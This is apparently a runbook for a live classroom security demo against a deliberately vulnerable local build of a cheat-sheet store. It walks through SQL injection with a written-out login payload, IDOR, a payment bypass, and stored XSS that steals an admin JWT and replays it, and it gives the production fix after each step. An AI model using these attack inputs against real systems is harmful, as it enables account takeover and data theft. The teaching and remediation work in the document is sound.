# 10-Minute Live Demo Runbook — Peanut Cheat Sheets (dev)

Uses the **real Peanut UI** (forked, Google login swapped for username/password)
wired to the vulnerable API. Exploits are shown in the UI where natural, and in
Burp/curl where that's clearer ("this is a technical demo, not a polished one").

**Before you start:**
```bash
docker compose down -v && docker compose up -d --build   # clean seed
python3 -m http.server 9000                              # terminal A: XSS listener (V6)
# Browser: http://localhost:3000  (proxy through Burp; open devtools Network)
```
Keep `exploits/` open in terminal B. Each step ends with the **real prod control**
the dev box regressed from — that line is your remediation.

---

### 0:00–1:30 · Recon (CLO2)
- `curl -s localhost:3000/robots.txt` → disallows `/admin`, `/debug`; comment
  leaks `dev.peanutcheatsheets.local`. View-source on `/` shows the same comment.
- `curl -s localhost:4000/debug | python3 -m json.tool | head -25` → stack,
  environment, and the **weak JWT secret**. "A debug route was left enabled."

### 1:30–3:00 · V1 SQL injection (login UI)
- Browser → **Sign in**. Email: `x' OR '1'='1' --`  Password: anything → logged
  in as the first user (**admin**). Show it in Burp.
- `./v1_sqli.sh` → UNION dump of `admin_secrets` (the flag).
- **Remediation:** prod uses parameterized queries everywhere (`config/database.js`,
  `middleware/auth.js:262`). Never build SQL by string concatenation.

### 3:00–4:30 · V2 IDOR (Burp)
- Logged in as Alice (owns nothing), open **My Purchases** / a receipt — in Burp
  you see `GET /api/purchases/<id>`. Change the id to `1` → **Bob's** order; hit
  `/api/purchases/1/download` → his PDF. Or `./v2_idor.sh`.
- **Remediation:** prod scopes every by-id query `AND p.user_id=$2`
  (`routes/purchases.js:229,314`); the watermark ties a leak to a buyer.

### 4:30–6:00 · V5 payment bypass
- As Alice, open the premium **ITS323** sheet → **Add to cart** → **Cart** →
  **Checkout**. A PromptPay QR appears and the order sits **pending** (the legacy
  QR carries no reference, so it can't auto-confirm).
- Run `./v5_payment_bypass.sh` → it flips Alice's pending order(s) to **paid**
  with no payment and downloads the premium PDF. The open QR screen flips to
  "paid"; refresh the sheet and the button is now **Download**.
- **Remediation:** prod sets `paid` only via `purchaseLedger` + signature-verified
  Stripe webhook / `requireStaff` approval (`app.js:119`, `routes/admin.js:150`).

### 6:00–8:30 · V6 chain: stored XSS → token theft → takeover  ⭐ headline
- As Alice, **post a review** whose text is the payload in `exploits/payload.js`
  (an `<img onerror>` that reads `localStorage.auth_token`). The review box opens
  for the owner of a paid sheet or for any **free** sheet — simplest is the free
  **CSS484** sheet (no purchase needed), or review ITS323 right after V5. Prod
  escapes review text; this dev build renders it with `dangerouslySetInnerHTML`.
- **Open the same sheet as the admin** (second browser profile; sign in as
  admin@…). Terminal A logs `GET /steal?t=<admin JWT>`.
- Replay the stolen JWT: `curl -s localhost:4000/api/admin/users -H "Authorization: Bearer <JWT>"`.
  (If the victim were a buyer, fold in **V3** to forge `is_admin`.)
- **Remediation:** never `dangerouslySetInnerHTML` user content; sanitise + CSP
  (prod Helmet CSP `app.js:71-81`); httpOnly-cookie tokens so XSS can't read them.

### 8:30–9:30 · V3 + V4 (quick hits, curl)
- `./v3_forge_jwt.py` → Bob's real token 403, forged token 200 on `/api/admin/stats`.
- `./v4_admin_authz.sh` → a plain buyer lists all users and self-grants admin.
- **Remediation:** minimal JWT claims + live DB role check (`middleware/auth.js:246`,
  `config/database.js:59`); `requireAdmin` on every one of prod's 55 admin handlers.

### 9:30–10:00 · Wrap
- One line per vuln: root cause → impact → the fix (already in prod).
  Defence-in-depth: parameterized queries · object-level authz · server-verified
  payment state · output encoding + CSP · least-privilege, server-trusted tokens.
